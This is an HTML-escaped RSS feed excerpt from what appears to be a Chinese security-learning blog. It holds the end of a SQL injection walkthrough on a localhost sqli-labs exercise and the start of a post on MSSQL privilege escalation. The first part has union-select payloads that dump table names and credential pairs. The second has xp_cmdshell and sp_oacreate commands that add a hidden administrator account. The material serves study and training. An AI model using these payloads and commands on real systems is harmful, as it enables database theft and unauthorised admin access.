&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(table_name), database() &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.tables &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; table_schema &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; database() #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928231639522.png&#34; alt=&#34;image-20220928231639522&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;获取到security库中的所有表为&lt;/strong&gt;：&lt;code&gt;emails&lt;/code&gt;、&lt;code&gt;referers&lt;/code&gt;、&lt;code&gt;uagents&lt;/code&gt;、&lt;code&gt;users&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们比较关心账号密码相关，所以眼光聚焦到users表。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;核心&lt;/strong&gt;——在&lt;strong&gt;information_schema库&lt;/strong&gt;的&lt;strong&gt;Columns表&lt;/strong&gt;中，查询当&lt;strong&gt;table_schema&lt;/strong&gt;的值为我们刚刚获取的&lt;code&gt;security&lt;/code&gt; 且 &lt;strong&gt;table_name&lt;/strong&gt;为&lt;code&gt;users&lt;/code&gt;时&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(column_name), database() &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.columns &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; table_schema &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; database() &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; table_name &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;users&amp;#x27;&lt;/span&gt; #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;获取到security库中，users表里所有列为&lt;/strong&gt;：&lt;code&gt;id&lt;/code&gt;、&lt;code&gt;username&lt;/code&gt;、&lt;code&gt;password&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928232355430.png&#34; alt=&#34;image-20220928232355430&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们想要获取username 和 password的全部对应关系，使用concat_ws函数，把username和password用冒号拼接起来：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;核心&lt;/strong&gt;——由于已经知道了所在&lt;strong&gt;security库&lt;/strong&gt;，&lt;strong&gt;users表&lt;/strong&gt;，因此直接&lt;code&gt;select xxxx from security.users&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-2&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;39888&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(concat_ws(&lt;span class=&#34;string&#34;&gt;&amp;#x27;:&amp;#x27;&lt;/span&gt;, username, password)), &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; security.users #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928232842359.png&#34; alt=&#34;image-20220928232842359&#34;&gt;&lt;/p&gt;
&lt;p&gt;小练习&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;1.&lt;/span&gt;查看注入类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-1.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-1.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; # 报错(整型和单引号都会报错)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#2.确定整型注入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=1 # (只有整型不会报错)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: Kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#3.确定列数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=1 union select 1, 2, 3 #&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: Kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#4.构造联合查询,确定所在库名。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), schema_name from information_schema.schemata #&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: information_schema&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#5.确定在这个库中，都有什么表&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(table_name) from information_schema.tables where table_schema = database()#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: emails,flag,users&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#6.确定我们要找flag表，并看这个表中有什么列&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &amp;#x27;&lt;/span&gt;flag&lt;span class=&#34;string&#34;&gt;&amp;#x27;#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: flag,value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#7.取列的值，另外把查询的from 后面改成对应的&amp;quot;库.表&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-1.php/?id=2356 union select 1,database(), group_concat(concat_ws(&amp;#x27;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;#x27;, flag, value)) from challenge.flag#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----结果-----&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:any,flag8:sqlc,flag9:tasi,flag10:moo,flag12:false,flag11:muse&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;至此，整型注入演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/MSSQL%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</guid>
            <title>MSSQL提权攻击</title>
            <link>https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/MSSQL%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</link>
            <category>数据库安全</category>
            <pubDate>Tue, 27 Sep 2022 22:46:06 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL-Server（MSSQL）提权&#34;&gt;&lt;a href=&#34;#SQL-Server（MSSQL）提权&#34; class=&#34;headerlink&#34; title=&#34;SQL Server（MSSQL）提权&#34;&gt;&lt;/a&gt;SQL Server（MSSQL）提权&lt;/h1&gt;&lt;p&gt;总结一下，下文使用有效命令全部为：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--1.xp_cmdshell提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;xp_cmdshell&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#master..xp_cmdshell的全写是master.dbo.xp_cmdshell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net user HeyJack HeyJack /add&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net localgroup administrators HeyJack /add&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;ipconfig&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;type C:\Documents and Settings\桌面\flag.txt&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--恢复语句&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;xp_cmdshell&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--2.sp_oacreate提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;Ole Automation Procedures&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;declare&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oacreate &lt;span class=&#34;string&#34;&gt;&amp;#x27;wscript.shell&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; output;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oamethod &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;run&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;c:\windows\system32\cmd.exe /c net user HeyJack1 HeyJack1 /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;declare&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oacreate &lt;span class=&#34;string&#34;&gt;&amp;#x27;wscript.shell&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; output;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oamethod &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;run&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;c:\windows\system32\cmd.exe /c net localgroup administrators HeyJack1 /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--恢复语句&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;Ole Automation Procedures&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--3.沙盒提权(不常用，所以没粘贴出来)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;0x01-环境准备&#34;&gt;&lt;a href=&#34;#0x01-环境准备&#34; class=&#34;headerlink&#34; title=&#34;0x01 环境准备&#34;&gt;&lt;/a&gt;0x01 环境准备&lt;/h2&gt;&lt;p&gt;输入用户名和密码，以&lt;code&gt;sa&lt;/code&gt;身份登录SQL Server2005&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927205858375.png&#34; alt=&#34;image-20220927205858375&#34;&gt;&lt;/p&gt;
&lt;p&gt;登录后可以看到这样的界面&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927210049933.png&#34; alt=&#34;image-20220927210049933&#34;&gt;&lt;/p&gt;
&lt;p&gt;首先我们了解下什么是sp_configure？&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927210431221.png&#34; alt=&#34;image-20220927210431221&#34;&gt;&lt;/p&gt;
&lt;p&gt;其中，在列出高级配置选项的例子中，官网显示了如何设置和列出所有配置选项：首先就是要设置&lt;code&gt;show advanced options&lt;/code&gt;为&lt;code&gt;1&lt;/code&gt;，可以显示高级选项。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;USE master;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GO  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;;  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;sp_configure的作用是显示或更改当前服务器的全局配置的高级选项，执行成功返回0，失败返回1，其中高级选项中包含cmdshell等。&lt;/p&gt;
&lt;h2 id=&#34;0x02-xp-cmdshell提权步骤&#34;&gt;&lt;a href=&#34;#0x02-xp-cmdshell提权步骤&#34; class=&#34;headerlink&#34; title=&#34;0x02 xp_cmdshell提权步骤&#34;&gt;&lt;/a&gt;0x02 xp_cmdshell提权步骤&lt;/h2&gt;&lt;h3 id=&#34;①第一步，更改当前服务器的全局配置首选高级选项为1&#34;&gt;&lt;a href=&#34;#①第一步，更改当前服务器的全局配置首选高级选项为1&#34; class=&#34;headerlink&#34; title=&#34;①第一步，更改当前服务器的全局配置首选高级选项为1&#34;&gt;&lt;/a&gt;①第一步，更改当前服务器的全局配置首选高级选项为1&lt;/h3&gt;&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#以下大写字母均可小写&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;RECONFIGURE;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927211220768.png&#34; alt=&#34;image-20220927211220768&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用鼠标选中一行，然后右键选择执行&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927211614093.png&#34; alt=&#34;image-20220927211614093&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;②第二步，打开cmd-shell&#34;&gt;&lt;a href=&#34;#②第二步，打开cmd-shell&#34; class=&#34;headerlink&#34; title=&#34;②第二步，打开cmd-shell&#34;&gt;&lt;/a&gt;②第二步，打开cmd-shell&lt;/h3&gt;&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;xp_cmdshell&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927211736845.png&#34; alt=&#34;image-20220927211736845&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;③第三步，输入你想执行的windows-cmd命令。&#34;&gt;&lt;a href=&#34;#③第三步，输入你想执行的windows-cmd命令。&#34; class=&#34;headerlink&#34; title=&#34;③第三步，输入你想执行的windows cmd命令。&#34;&gt;&lt;/a&gt;③第三步，输入你想执行的windows cmd命令。&lt;/h3&gt;&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927211958154.png&#34; alt=&#34;image-20220927211958154&#34;&gt;&lt;/p&gt;
&lt;p&gt;言归正传，我们为系统添加属于&lt;code&gt;攻击者自己的net user账户&lt;/code&gt;(主要目的是使用已知的用户名和密码)&lt;/p&gt;
